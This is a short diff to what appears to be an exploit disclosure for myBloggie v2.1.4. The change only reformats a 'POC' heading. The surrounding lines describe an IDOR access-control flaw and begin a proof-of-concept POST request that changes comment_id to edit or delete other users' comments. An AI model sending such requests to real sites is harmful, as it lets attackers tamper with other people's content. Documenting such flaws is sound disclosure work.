@@ -7,7 +7,7 @@
 ## Exploit Description:
 ## myBloggie v2.1.4 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to update and delete comment that owned by other user(horizontal privilege escalation).
 
-## -----------------------------------------------POC-------------------------------------------------------------------
+## ---------------------------------POC-----------------------------
 
 ```
 POST /index.php?mode=editcom&post_id=2&comment_id=2(CHANGE HERE) HTTP/1.1
